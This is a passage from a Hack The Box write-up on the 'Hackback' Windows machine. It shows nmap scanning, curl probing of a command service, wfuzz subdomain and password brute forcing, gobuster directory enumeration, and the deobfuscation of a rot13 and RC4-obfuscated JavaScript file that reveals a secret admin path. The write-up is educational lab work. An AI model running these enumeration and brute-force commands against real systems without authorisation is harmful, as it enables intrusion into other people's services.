---
layout: post
title: Hack The Box - Hackback
categories: hack-the-box
tags: [Windows, Windows Exploitation, Web, RCE, php, pivoting]
image: /hackthebox/hackback/0.png
---

<hr>
### Quick Summary
#### Hey guys today Hackback retired and here's my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It's a Windows machine and its ip is `10.10.10.128`, I added it to `/etc/hosts` as `hackback.htb`. Let's jump right in !
![](/images/hackthebox/hackback/0.png)
<hr>
### Nmap
#### As always we will start with `nmap` to scan for open ports and services :
`nmap -sV -sT -sC hackback.htb`
![](/images/hackthebox/hackback/1.png)
#### We got two `http` ports, 80 and 6666, I also ran a full scan but we'll get to that later.
<br>
<hr>
### HTTP
#### I checked both ports, on 80 there was this donkey image :
![](/images/hackthebox/hackback/2.png)
#### I ran `gobuster` and it got nothing.
#### I couldn't send a request to port 6666 from the browser so I used curl :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ 
"Missing Command!"
```
#### It says `"Missing Command!"`
#### So I tried `/help` :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help
"hello,proc,whoami,list,info,services,netsat,ipconfig"
```
#### It returned a list of what commands we can use. `/whoami` lists information about the user running this service, not really important. `/list` lists the files in the current directory :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list
[
    {
        "Name":  "aspnet_client",
        "length":  null
    },
    {
        "Name":  "default",
        "length":  null
    },
    {
        "Name":  "new_phish",
        "length":  null
    },
    {
        "Name":  "http.ps1",
        "Length":  1867
    },
    {
        "Name":  "iisstart.htm",
        "Length":  703
    },
    {
        "Name":  "iisstart.png",
        "Length":  99710
    }
]
```
#### `/info` prints system information, we might need that :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info
{
    "WindowsBuildLabEx":  "17763.1.amd64fre.rs5_release.180914-1434",
    "WindowsCurrentVersion":  "6.3",
    "WindowsEditionId":  "ServerStandard",
    "WindowsInstallationType":  "Server",
    "WindowsInstallDateFromRegistry":  "\/Date(1542436874000)\/",
    "WindowsProductId":  "00429-00520-27817-AA520",
    "WindowsProductName":  "Windows Server 2019 Standard",
    "WindowsRegisteredOrganization":  "",
    "WindowsRegisteredOwner":  "Windows User",
    "WindowsSystemRoot":  "C:\\Windows",
    "WindowsVersion":  "1809",
    "BiosCharacteristics":  null,
    "BiosBIOSVersion":  null,
    "BiosBuildNumber":  null,
    "BiosCaption":  null,
    "BiosCodeSet":  null,
    "BiosCurrentLanguage":  null,
    "BiosDescription":  null,
    "BiosEmbeddedControllerMajorVersion":  null,
    "BiosEmbeddedControllerMinorVersion":  null,
    "BiosFirmwareType":  null,
    "BiosIdentificationCode":  null,
    "BiosInstallableLanguages":  null,
    "BiosInstallDate":  null,
    "BiosLanguageEdition":  null,
    "BiosListOfLanguages":  null,
    "BiosManufacturer":  null,
    "BiosName":  null,
    "BiosOtherTargetOS":  null,
    "BiosPrimaryBIOS":  null,
    "BiosReleaseDate":  null,
    "BiosSeralNumber":  null,
    "BiosSMBIOSBIOSVersion":  null,
    "BiosSMBIOSMajorVersion":  null,
    "BiosSMBIOSMinorVersion":  null,
    "BiosSMBIOSPresent":  null,
    "BiosSoftwareElementState":  null,
    "BiosStatus":  null,
    "BiosSystemBiosMajorVersion":  null,
    "BiosSystemBiosMinorVersion":  null,
    "BiosTargetOperatingSystem":  null,
    "BiosVersion":  null,
    "CsAdminPasswordStatus":  null,
    "CsAutomaticManagedPagefile":  null,
    "CsAutomaticResetBootOption":  null,
    "CsAutomaticResetCapability":  null,
    "CsBootOptionOnLimit":  null,
    "CsBootOptionOnWatchDog":  null,
    "CsBootROMSupported":  null,
    "CsBootStatus":  null,
    "CsBootupState":  null,
    "CsCaption":  null,
    "CsChassisBootupState":  null,
    "CsChassisSKUNumber":  null,
    "CsCurrentTimeZone":  null,
    "CsDaylightInEffect":  null,
    "CsDescription":  null,
    "CsDNSHostName":  null,
    "CsDomain":  null,
    "CsDomainRole":  null,
    "CsEnableDaylightSavingsTime":  null,
    "CsFrontPanelResetStatus":  null,
    "CsHypervisorPresent":  null,
    "CsInfraredSupported":  null,
    "CsInitialLoadInfo":  null,
    "CsInstallDate":  null,
    "CsKeyboardPasswordStatus":  null,
    "CsLastLoadInfo":  null,
    "CsManufacturer":  null,
    "CsModel":  null,
    "CsName":  null,
    "CsNetworkAdapters":  null,
    "CsNetworkServerModeEnabled":  null,
    "CsNumberOfLogicalProcessors":  null,
    "CsNumberOfProcessors":  null,
    "CsProcessors":  null,
    "CsOEMStringArray":  null,
    "CsPartOfDomain":  null,
    "CsPauseAfterReset":  null,
    "CsPCSystemType":  null,
    "CsPCSystemTypeEx":  null,
    "CsPowerManagementCapabilities":  null,
    "CsPowerManagementSupported":  null,
    "CsPowerOnPasswordStatus":  null,
    "CsPowerState":  null,
    "CsPowerSupplyState":  null,
    "CsPrimaryOwnerContact":  null,
    "CsPrimaryOwnerName":  null,
    "CsResetCapability":  null,
    "CsResetCount":  null,
    "CsResetLimit":  null,
    "CsRoles":  null,
    "CsStatus":  null,
    "CsSupportContactDescription":  null,
    "CsSystemFamily":  null,
    "CsSystemSKUNumber":  null,
    "CsSystemType":  null,
    "CsThermalState":  null,
    "CsTotalPhysicalMemory":  null,
    "CsPhyicallyInstalledMemory":  null,
    "CsUserName":  null,
    "CsWakeUpType":  null,
    "CsWorkgroup":  null,
    "OsName":  null,
    "OsType":  null,
    "OsOperatingSystemSKU":  null,
    "OsVersion":  null,
    "OsCSDVersion":  null,
    "OsBuildNumber":  null,
    "OsHotFixes":  null,
    "OsBootDevice":  null,
    "OsSystemDevice":  null,
    "OsSystemDirectory":  null,
    "OsSystemDrive":  null,
    "OsWindowsDirectory":  null,
    "OsCountryCode":  null,
    "OsCurrentTimeZone":  null,
    "OsLocaleID":  null,
    "OsLocale":  null,
    "OsLocalDateTime":  null,
    "OsLastBootUpTime":  null,
    "OsUptime":  null,
    "OsBuildType":  null,
    "OsCodeSet":  null,
    "OsDataExecutionPreventionAvailable":  null,
    "OsDataExecutionPrevention32BitApplications":  null,
    "OsDataExecutionPreventionDrivers":  null,
    "OsDataExecutionPreventionSupportPolicy":  null,
    "OsDebug":  null,
    "OsDistributed":  null,
    "OsEncryptionLevel":  null,
    "OsForegroundApplicationBoost":  null,
    "OsTotalVisibleMemorySize":  null,
    "OsFreePhysicalMemory":  null,
    "OsTotalVirtualMemorySize":  null,
    "OsFreeVirtualMemory":  null,
    "OsInUseVirtualMemory":  null,
    "OsTotalSwapSpaceSize":  null,
    "OsSizeStoredInPagingFiles":  null,
    "OsFreeSpaceInPagingFiles":  null,
    "OsPagingFiles":  null,
    "OsHardwareAbstractionLayer":  null,
    "OsInstallDate":  null,
    "OsManufacturer":  null,
    "OsMaxNumberOfProcesses":  null,
    "OsMaxProcessMemorySize":  null,
    "OsMuiLanguages":  null,
    "OsNumberOfLicensedUsers":  null,
    "OsNumberOfProcesses":  null,
    "OsNumberOfUsers":  null,
    "OsOrganization":  null,
    "OsArchitecture":  null,
    "OsLanguage":  null,
    "OsProductSuites":  null,
    "OsOtherTypeDescription":  null,
    "OsPAEEnabled":  null,
    "OsPortableOperatingSystem":  null,
    "OsPrimary":  null,
    "OsProductType":  null,
    "OsRegisteredUser":  null,
    "OsSerialNumber":  null,
    "OsServicePackMajorVersion":  null,
    "OsServicePackMinorVersion":  null,
    "OsStatus":  null,
    "OsSuites":  null,
    "OsServerLevel":  4,
    "KeyboardLayout":  null,
    "TimeZone":  "(UTC-08:00) Pacific Time (US \u0026 Canada)",
    "LogonServer":  null,
    "PowerPlatformRole":  1,
    "HyperVisorPresent":  null,
    "HyperVRequirementDataExecutionPreventionAvailable":  null,
    "HyperVRequirementSecondLevelAddressTranslation":  null,
    "HyperVRequirementVirtualizationFirmwareEnabled":  null,
    "HyperVRequirementVMMonitorModeExtensions":  null,
    "DeviceGuardSmartStatus":  0,
    "DeviceGuardRequiredSecurityProperties":  null,
    "DeviceGuardAvailableSecurityProperties":  null,
    "DeviceGuardSecurityServicesConfigured":  null,
    "DeviceGuardSecurityServicesRunning":  null,
    "DeviceGuardCodeIntegrityPolicyEnforcementStatus":  null,
    "DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus":  null
}
```
#### `/services` lists the services, that's also important and we might need it later :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services
[
    {
        "name":  "AJRouter",
        "startname":  "NT AUTHORITY\\LocalService",
        "displayname":  "AllJoyn Router Service",
        "status":  "OK"
    },
    {
        "name":  "ALG",
        "startname":  "NT AUTHORITY\\LocalService",
        "displayname":  "Application Layer Gateway Service",
        "status":  "OK"
    },
    {
        "name":  "AppHostSvc",
        "startname":  "localSystem",
        "displayname":  "Application Host Helper Service",
        "status":  "OK"
    },

    -------------------
    Removed Long Output
    -------------------
    
    {
        "name":  "WpnService",
        "startname":  "LocalSystem",
        "displayname":  "Windows Push Notifications System Service",
        "status":  "OK"
    },
    {
        "name":  "WSearch",
        "startname":  "LocalSystem",
        "displayname":  "Windows Search",
        "status":  "OK"
    },
    {
        "name":  "wuauserv",
        "startname":  "LocalSystem",
        "displayname":  "Windows Update",
        "status":  "OK"
    }
]
```
#### `/netstat` lists the listening ports, we can check that when we need to know about some internal services but for now we will just ignore it. The rest of the commands are not really doing anything useful. I tried to exploit this service since it's executing system commands, however it wasn't possible. 
#### I used `wfuzz` with [subdomains-top1million-5000.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt) from [seclists](https://github.com/danielmiessler/SecLists) to enumerate any possible subdomains :
```
root@kali:~/Desktop/HTB/boxes/hackback# wfuzz --hc 614 -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.hackback.htb" http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****                              
Target: http://10.10.10.128/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000007:  C=200     33 L       54 W          614 Ch        "webdisk"
000008:  C=200     33 L       54 W          614 Ch        "pop"
000001:  C=200     33 L       54 W          614 Ch        "www"
000002:  C=200     33 L       54 W          614 Ch        "mail"
000005:  C=200     33 L       54 W          614 Ch        "webmail"
000006:  C=200     33 L       54 W          614 Ch        "smtp"
000009:  C=200     33 L       54 W          614 Ch        "cpanel"
000010:  C=200     33 L       54 W          614 Ch        "whm"
000003:  C=200     33 L       54 W          614 Ch        "ftp"
000004:  C=200     33 L       54 W          614 Ch        "localhost"
000011:  C=200     33 L       54 W          614 Ch        "ns1"
000013:  C=200     33 L       54 W          614 Ch        "autodiscover"
000014:  C=200     33 L       54 W          614 Ch        "autoconfig"
000015:  C=200     33 L       54 W          614 Ch        "ns"
000016:  C=200     33 L       54 W          614 Ch        "test"
000012:  C=200     33 L       54 W          614 Ch        "ns2"
000017:  C=200     33 L       54 W          614 Ch        "m"
000020:  C=200     33 L       54 W          614 Ch        "www2"
000021:  C=200     33 L       54 W          614 Ch        "ns3"
000018:  C=200     33 L       54 W          614 Ch        "blog"
000019:  C=200     33 L       54 W          614 Ch        "dev"
000023:  C=200     33 L       54 W          614 Ch        "forum"
000022:  C=200     33 L       54 W          614 Ch        "pop3"
000026:  C=200     33 L       54 W          614 Ch        "vpn"
000025:  C=200     33 L       54 W          614 Ch        "mail2"
000024:  C=200     27 L       66 W          825 Ch        "admin"
000027:  C=200     33 L       54 W          614 Ch        "mx"

^C 
Finishing pending requests...
```
#### `admin` gave a different response length, I added it to `/etc/hosts` :
![](/images/hackthebox/hackback/3.png)
#### It had this login form :
![](/images/hackthebox/hackback/4.png)
#### Which actually didn't do anything :
```
<form action="#" method="post">
    <!-- USERNAME INPUT -->
    <label for="username">Username</label>
    <input type="text" placeholder="Enter Username">
    <!-- PASSWORD INPUT -->
    <label for="password">Password</label>
    <input type="password" placeholder="Enter Password">
    <input type="submit" value="Log In">
    <a href="lost">Lost your Password?</a><br>
    <a href="signup">Don't have An account?</a>
</form>
```
#### Also the password reset and sign-up pages are non-existent :
![](/images/hackthebox/hackback/5.png)
#### By looking at the page source :
```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Admin Login</title>
    <link rel="stylesheet" href="/css/master.css">
<!-- <script SRC="js/.js"></script> -->
  </head>
  <body>

    <div class="login-box">
      <img src="img/logo.png" class="avatar" alt="Avatar Image">
      <h1>Login Here</h1>
      <form action="#" method="post">
        <!-- USERNAME INPUT -->
        <label for="username">Username</label>
        <input type="text" placeholder="Enter Username">
        <!-- PASSWORD INPUT -->
        <label for="password">Password</label>
        <input type="password" placeholder="Enter Password">
        <input type="submit" value="Log In">
        <a href="lost">Lost your Password?</a><br>
        <a href="signup">Don't have An account?</a>
      </form>
    </div>
  </body>
</html>
```
#### We notice this weird comment : `<!-- <script SRC="js/.js"></script> -->`
#### However `/js` gave a `403` :
![](/images/hackthebox/hackback/6.png)
#### I ran `gobuster` with `/usr/share/wordlists/dirb/common.txt` and `.js` extension :
```
root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirb/common.txt -x js
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/js/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : js
[+] Timeout      : 10s
=====================================================
2019/07/05 09:37:16 Starting gobuster
=====================================================
/private.js (Status: 200)
```
<br>
<hr>
### Script Deobfuscation
#### By looking at `private.js` it's not really what we expect a javascript file to be :
```
<script>
	ine n=['\k57\k78\k49\k6n\k77\k72\k37\k44\k75\k73\k4s\k38\k47\k73\k4o\k76\k52\k77\k42\k2o\k77\k71\k33\k44\k75\k4q\k4o\k72\k77\k72\k4p\k44\k67\k63\k4s\k69\k77\k72\k59\k31\k4o\k45\k45\k67\k47\k38\k4o\k43\k77\k71\k37\k44\k6p\k38\k4o\k33','\k41\k63\k4s\k4q\k77\k71\k76\k44\k71\k51\k67\k43\k77\k34\k2s\k43\k74\k32\k6r\k44\k74\k4q\k4o\k68\k5n\k63\k4o\k44\k77\k71\k54\k43\k70\k54\k73\k79\k77\k37\k6r\k43\k68\k73\k4s\k51\k58\k4q\k4s\k35\k57\k38\k4o\k70\k44\k73\k4s\k74\k4r\k43\k44\k44\k76\k41\k6n\k43\k67\k79\k6o\k3q','\k77\k35\k48\k44\k72\k38\k4s\k37\k64\k44\k52\k6q\k4q\k4q\k4o\k4n\k77\k34\k6n\k44\k6p\k56\k52\k6r\k77\k72\k74\k37\k77\k37\k73\k30\k77\k6s\k31\k61\k77\k37\k73\k41\k51\k73\k4o\k73\k66\k73\k4s\k45\k77\k34\k58\k44\k73\k52\k6n\k43\k6p\k4q\k4s\k77\k46\k7n\k72\k43\k6q\k7n\k70\k76\k43\k41\k6n\k43\k75\k42\k7n\k44\k73\k73\k4o\k39\k46\k38\k4s\k34\k77\k71\k5n\k6r\k57\k73\k4o\k68'];(shapgvba(p,q){ine r=shapgvba(s){juvyr(--s){p['chfu'](p['fuvsg']());}};r(++q);}(n,0k66));ine o=shapgvba(p,q){p=p-0k0;ine r=n[p];vs(o['ZfHYzi']===haqrsvarq){(shapgvba(){ine s;gel{ine t=Shapgvba('erghea\k20(shapgvba()\k20'+'{}.pbafgehpgbe(\k22erghea\k20guvf\k22)(\k20)'+');');s=t();}pngpu(u){s=jvaqbj;}ine v='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/=';s['ngbo']||(s['ngbo']=shapgvba(w){ine x=Fgevat(w)['ercynpr'](/=+$/,'');sbe(ine y=0k0,z,a,b=0k0,c='';a=x['puneNg'](b++);~a&&(z=y%0k4?z*0k40+a:a,y++%0k4)?c+=Fgevat['sebzPunePbqr'](0kss&z>>(-0k2*y&0k6)):0k0){a=v['vaqrkBs'](a);}erghea c;});}());ine d=shapgvba(e,q){ine g=[],h=0k0,i,j='',k='';e=ngbo(e);sbe(ine l=0k0,m=e['yratgu'];l<m;l++){k+='%'+('00'+e['punePbqrNg'](l)['gbFgevat'](0k10))['fyvpr'](-0k2);}e=qrpbqrHEVPbzcbarag(k);sbe(ine N=0k0;N<0k100;N++){g[N]=N;}sbe(N=0k0;N<0k100;N++){h=(h+g[N]+q['punePbqrNg'](N%q['yratgu']))%0k100;i=g[N];g[N]=g[h];g[h]=i;}N=0k0;h=0k0;sbe(ine O=0k0;O<e['yratgu'];O++){N=(N+0k1)%0k100;h=(h+g[N])%0k100;i=g[N];g[N]=g[h];g[h]=i;j+=Fgevat['sebzPunePbqr'](e['punePbqrNg'](O)^g[(g[N]+g[h])%0k100]);}erghea j;};o['BbNPpq']=d;o['dFYjTx']={};o['ZfHYzi']=!![];}ine P=o['dFYjTx'][p];vs(P===haqrsvarq){vs(o['cVwyDO']===haqrsvarq){o['cVwyDO']=!![];}r=o['BbNPpq'](r,q);o['dFYjTx'][p]=r;}ryfr{r=P;}erghea r;};ine k='\k53\k65\k63\k75\k72\k65\k20\k4p\k6s\k67\k69\k6r\k20\k42\k79\k70\k61\k73\k73';ine m=o('0k0','\k50\k5q\k53\k36');ine u=o('0k1','\k72\k37\k54\k59');ine l=o('0k2','\k44\k41\k71\k67');ine g='\k3s\k61\k63\k74\k69\k6s\k6r\k3q\k28\k73\k68\k6s\k77\k2p\k6p\k69\k73\k74\k2p\k65\k78\k65\k63\k2p\k69\k6r\k69\k74\k29';ine f='\k26\k73\k69\k74\k65\k3q\k28\k74\k77\k69\k74\k74\k65\k72\k2p\k70\k61\k79\k70\k61\k6p\k2p\k66\k61\k63\k65\k62\k6s\k6s\k6o\k2p\k68\k61\k63\k6o\k74\k68\k65\k62\k6s\k78\k29';ine v='\k26\k70\k61\k73\k73\k77\k6s\k72\k64\k3q\k2n\k2n\k2n\k2n\k2n\k2n\k2n\k2n';ine x='\k26\k73\k65\k73\k73\k69\k6s\k6r\k3q';ine j='\k4r\k6s\k74\k68\k69\k6r\k67\k20\k6q\k6s\k72\k65\k20\k74\k6s\k20\k73\k61\k79';
</script>
```
#### First thing we notice is that it's not actually `js`. `ine n` ? This doesn't look like `js`, most likely it's gonna be `var`. `v` is the 22nd letter in alphabet while `i` is the 9th. `22 - 9 = 13`
#### So this script is `rot 13` encoded. I used [rot13.com](https://www.rot13.com) to decode it :
![](/images/hackthebox/hackback/7.png)
```
var a=['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33','\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d','\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x66));var b=function(c,d){c=c-0x0;var e=a[c];if(b['MsULmv']===undefined){(function(){var f;try{var g=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');f=g();}catch(h){f=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';f['atob']||(f['atob']=function(j){var k=String(j)['replace'](/=+$/,'');for(var l=0x0,m,n,o=0x0,p='';n=k['charAt'](o++);~n&&(m=l%0x4?m*0x40+n:n,l++%0x4)?p+=String['fromCharCode'](0xff&m>>(-0x2*l&0x6)):0x0){n=i['indexOf'](n);}return p;});}());var q=function(r,d){var t=[],u=0x0,v,w='',x='';r=atob(r);for(var y=0x0,z=r['length'];y<z;y++){x+='%'+('00'+r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);}r=decodeURIComponent(x);for(var A=0x0;A<0x100;A++){t[A]=A;}for(A=0x0;A<0x100;A++){u=(u+t[A]+d['charCodeAt'](A%d['length']))%0x100;v=t[A];t[A]=t[u];t[u]=v;}A=0x0;u=0x0;for(var B=0x0;B<r['length'];B++){A=(A+0x1)%0x100;u=(u+t[A])%0x100;v=t[A];t[A]=t[u];t[u]=v;w+=String['fromCharCode'](r['charCodeAt'](B)^t[(t[A]+t[u])%0x100]);}return w;};b['OoACcd']=q;b['qSLwGk']={};b['MsULmv']=!![];}var C=b['qSLwGk'][c];if(C===undefined){if(b['pIjlQB']===undefined){b['pIjlQB']=!![];}e=b['OoACcd'](e,d);b['qSLwGk'][c]=e;}else{e=C;}return e;};var x='\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';var z=b('0x0','\x50\x5d\x53\x36');var h=b('0x1','\x72\x37\x54\x59');var y=b('0x2','\x44\x41\x71\x67');var t='\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';var s='\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';var i='\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';var k='\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';var w='\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
```
#### Now this is better. I also used a `js` beautifier to make it easily readable :
![](/images/hackthebox/hackback/8.png)
```
var a = ['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33', '\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d', '\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];
(function(c, d) {
    var e = function(f) {
        while (--f) {
            c['push'](c['shift']());
        }
    };
    e(++d);
}(a, 0x66));
var b = function(c, d) {
    c = c - 0x0;
    var e = a[c];
    if (b['MsULmv'] === undefined) {
        (function() {
            var f;
            try {
                var g = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
                f = g();
            } catch (h) {
                f = window;
            }
            var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            f['atob'] || (f['atob'] = function(j) {
                var k = String(j)['replace'](/=+$/, '');
                for (var l = 0x0, m, n, o = 0x0, p = ''; n = k['charAt'](o++); ~n && (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String['fromCharCode'](0xff & m >> (-0x2 * l & 0x6)) : 0x0) {
                    n = i['indexOf'](n);
                }
                return p;
            });
        }());
        var q = function(r, d) {
            var t = [],
                u = 0x0,
                v, w = '',
                x = '';
            r = atob(r);
            for (var y = 0x0, z = r['length']; y < z; y++) {
                x += '%' + ('00' + r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);
            }
            r = decodeURIComponent(x);
            for (var A = 0x0; A < 0x100; A++) {
                t[A] = A;
            }
            for (A = 0x0; A < 0x100; A++) {
                u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 0x100;
                v = t[A];
                t[A] = t[u];
                t[u] = v;
            }
            A = 0x0;
            u = 0x0;
            for (var B = 0x0; B < r['length']; B++) {
                A = (A + 0x1) % 0x100;
                u = (u + t[A]) % 0x100;
                v = t[A];
                t[A] = t[u];
                t[u] = v;
                w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 0x100]);
            }
            return w;
        };
        b['OoACcd'] = q;
        b['qSLwGk'] = {};
        b['MsULmv'] = !![];
    }
    var C = b['qSLwGk'][c];
    if (C === undefined) {
        if (b['pIjlQB'] === undefined) {
            b['pIjlQB'] = !![];
        }
        e = b['OoACcd'](e, d);
        b['qSLwGk'][c] = e;
    } else {
        e = C;
    }
    return e;
};
var x = '\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';
var z = b('0x0', '\x50\x5d\x53\x36');
var h = b('0x1', '\x72\x37\x54\x59');
var y = b('0x2', '\x44\x41\x71\x67');
var t = '\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';
var s = '\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';
var i = '\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';
var k = '\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';
var w = '\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
```
#### As you can see it's still heavily obfuscated, I solved this by pasting the code in the `js` console. It will do the magic happening in these functions then we can just read the variables at the bottom of the script : `x z h y t s i k w`
![](/images/hackthebox/hackback/9.png)
#### We got this message :
```
Secure Login Bypass
Remember the secret path is
2bb6916122f1da34dcd916421e531578
Just in case I loose access to the admin panel
?action=(show,list,exec,init)
&site=(twitter,paypal,facebook,hackthebox)
&password=*****
&session=
Nothing more to say
```
#### Going to that path only caused a redirect, so we need to enumerate more.
<br>
<hr>
### Accessing the Secret Path
#### From the secret message we know what parameters it's expecting us to send : (`?action=&site=&password=&session=`). This is probably gonna be a `php` page. So I ran `gobuster` on that path with the same wordlist I used before and `.php` extension :
```
root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/common.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/07/05 10:08:09 Starting gobuster
=====================================================
/webadmin.php (Status: 302)
```
#### Great we got `webadmin.php`, I tried again and now I didn't get a redirect :
```
root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=test&session='
Wrong secret key!
```
#### But I got `Wrong secret key!`, and that's expected because I set the password to `test`. I used `wfuzz` again with [darkweb2017-top10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt) from [seclists](https://github.com/danielmiessler/SecLists) to bruteforce the password which happened to be a very easy one :
```
root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -u 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session=' -w darkweb2017-top10000.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
